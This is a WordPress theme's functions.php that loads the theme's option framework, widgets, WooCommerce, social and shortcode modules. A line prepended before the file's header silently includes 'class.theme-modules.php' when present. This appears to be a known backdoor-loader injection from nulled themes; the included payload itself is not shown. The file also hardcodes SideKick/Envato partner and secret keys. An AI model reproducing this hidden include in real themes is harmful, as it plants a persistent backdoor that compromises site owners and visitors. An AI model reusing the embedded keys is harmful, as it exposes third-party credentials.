<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*-----------------------------------------------------------------------------------

	Here we have all the custom functions for the theme
	Please be extremely cautious editing this file.
	You have been warned!

-------------------------------------------------------------------------------------*/

// Option-Tree Theme Mode
require get_theme_file_path('/inc/admin/option-tree/init.php');

// Mobile Detect
require get_theme_file_path('/inc/framework/thb-mobile-detect.php');

// Theme Admin
require get_theme_file_path('/inc/admin/welcome/fuelthemes.php');

// TGM Plugin Activation Class
require get_theme_file_path('/inc/admin/plugins/plugins.php');

// Imports
require get_theme_file_path('/inc/admin/imports/import.php');

// Script Calls
require get_theme_file_path('/inc/script-calls.php');

// Ajax
require get_theme_file_path('/inc/ajax.php');

// Add Menu Support
require get_theme_file_path('/inc/wp3menu.php');

// Lazy Loading
require get_theme_file_path('/inc/framework/thb-lazyload.php');

// Enable Sidebars
require get_theme_file_path('/inc/sidebar.php');

// Widgets
require get_theme_file_path('/inc/widgets.php');

// Social Functions
require get_theme_file_path('/inc/framework/thb-instagram.php');
require get_theme_file_path('/inc/post-social.php');

// Misc
require get_theme_file_path('/inc/misc.php');

// Category Settings
require get_theme_file_path('/inc/framework/thb-category-settings.php');

// Reviews
require get_theme_file_path('/inc/post-reviews.php');

// CSS Output of Theme Options
require get_theme_file_path('/inc/selection.php');

// Email Downloads
require get_theme_file_path('/inc/download_emails.php');

// Twitter oAuth
require get_theme_file_path('/inc/framework/thb-twitter-api.php');
require get_theme_file_path('/inc/framework/thb-twitter-helper.php');

// Share Counts
require get_theme_file_path('/inc/framework/thb-social-shares/posts-share-count.php');

// Visual Composer Integration
require get_theme_file_path('/inc/framework/visualcomposer/visualcomposer.php');

// Shortcode Generator & Shortcodes (+)
require get_theme_file_path('/inc/framework/tinymce/tinymce-class.php');
require get_theme_file_path('/inc/framework/tinymce/shortcode-processing.php');

// WooCommerce Settings specific for theme
require get_theme_file_path('/inc/woocommerce.php');
require get_theme_file_path('/inc/woocommerce-category-image.php');

// Advertisements
require get_theme_file_path('/inc/advertisement.php');

// SideKick Integration
define('SK_PRODUCT_ID',459);
define('SK_ENVATO_PARTNER', '5LXnCIbjT0TD4jcyZuhMSAgVwil8hU5TTxIW5cNNwbA=');
define('SK_ENVATO_SECRET', 'RqjBt/YyaTOjDq+lKLWhL10sFCMCJciT9SPUKLBBmso=');

// Tribe Events Compatibility */
add_action('tribe_events_before_html', function() {
	echo '<div class="row"><div class="small-12 columns">';
});
add_action('tribe_events_after_html', function() {
	echo '</div></div>';
});